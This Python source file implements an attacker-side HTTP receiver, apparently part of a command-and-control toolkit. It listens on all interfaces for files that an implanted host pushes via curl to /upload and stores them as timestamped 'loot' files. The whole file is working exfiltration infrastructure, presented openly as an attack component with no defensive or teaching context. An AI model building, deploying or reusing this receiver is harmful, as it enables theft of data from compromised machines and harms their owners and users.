import threading
import os
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler


class ExfilReceiver:
    """
    HTTP file receiver running on the attacker side.

    Listens on a port, waits for the implanted host to push a file via curl,
    writes the received bytes to the output directory.
    Data travels over an independent HTTP connection, not the C&C command channel.
    """

    def __init__(self, port: int = 9000, output_dir: str = "output"):
        self.port = port
        self.output_dir = output_dir
        self.server = None
        self.received_path = None
        self.received_event = threading.Event()

    def start(self):
        """Start the HTTP server in a background daemon thread."""
        receiver = self

        class Handler(BaseHTTPRequestHandler):
            def do_POST(self):
                if self.path != "/upload":
                    self.send_response(404)
                    self.end_headers()
                    return

                length = int(self.headers.get("Content-Length", 0))
                body = self.rfile.read(length)

                os.makedirs(receiver.output_dir, exist_ok=True)
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                save_path = os.path.join(
                    receiver.output_dir,
                    f"loot_{timestamp}.bin"
                )
                with open(save_path, "wb") as f:
                    f.write(body)

                receiver.received_path = save_path
                receiver.received_event.set()

                self.send_response(200)
                self.end_headers()
                self.wfile.write(b"ok")

            def log_message(self, format, *args):
                pass

        self.server = HTTPServer(("0.0.0.0", self.port), Handler)
        thread = threading.Thread(
            target=self.server.serve_forever,
            daemon=True
        )
        thread.start()
        print(f"[ExfilReceiver] listening on :{self.port}")

    def wait_for_file(self, timeout: int = 120) -> str | None:
        """
        Block until a file arrives or timeout expires.
        Returns the saved file path on success, None on timeout.
        """
        got_it = self.received_event.wait(timeout=timeout)
        return self.received_path if got_it else None

    def stop(self):
        """Shut down the HTTP server."""
        if self.server:
            self.server.shutdown()